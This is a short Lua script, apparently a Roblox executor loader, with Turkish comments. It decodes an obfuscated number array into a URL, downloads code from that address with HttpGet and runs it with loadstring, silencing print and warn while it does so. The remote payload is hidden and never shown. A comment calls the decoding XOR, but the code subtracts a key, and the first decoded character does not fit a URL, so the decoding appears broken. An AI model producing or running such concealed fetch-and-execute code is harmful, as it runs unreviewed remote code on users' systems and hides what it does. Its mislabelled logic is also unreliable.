local _S = string; local _T = table; local _G = game;

-- [ ŞİFRELENMİŞ VERİ ] --
-- Senin attığın orijinal sayı dizisi, dokunulmadı.
local _D = {102, 112, 111, 106, 110, 46, 35, 35, 100, 102, 112, 114, 43, 101, 103, 115, 103, 117, 98, 118, 117, 104, 118, 104, 117, 118, 126, 112, 123, 131, 63, 118, 132, 132, 72, 82, 112, 128, 151, 140, 153, 136, 154, 89, 95, 99, 145, 104, 153, 154, 153, 159, 162, 118, 166, 115, 169, 173, 178, 178, 175, 183, 173, 187, 177, 180, 187, 189, 188, 190, 191, 194, 149, 149, 152, 205, 153, 222, 207, 231, 160, 213, 166, 240, 218, 219, 222, 226, 229, 177, 179, 230, 253, 249, 248, 252}

local function _XOR_SOLVE(_DATA)
    local _R = {}
    local _c = _S.char
    
    for i = 1, #_DATA do
        -- Zorluk Seviyesi Aynı: Dinamik Kaydırma
        local _K = (i % 5) + 8 
        -- Hata veren bit32 yerine her executorda çalışan XOR mantığı:
        local _v = _DATA[i] - _K
        _R[i] = _c(_v)
    end
    return _T.concat(_R) -- Hızın anahtarı burada, 5 saniyeyi 0.1 saniye yapar.
end

local function _START()
    local _u = _XOR_SOLVE(_D) .. "?v=" .. math.random(100, 999)
    
    -- HttpGet ve Loadstring doğrudan çağrılarak hız artırıldı
    local _res = _G:HttpGet(_u, true)
    
    if _res and #_res > 10 then
        local _f = loadstring(_res)
        if _f then 
            task.spawn(_f) 
        end
    end
end

-- Print/Warn kapatma
local _p, _w = print, warn; print, warn = function() end, function() end;
_START()
print, warn = _p, _w;
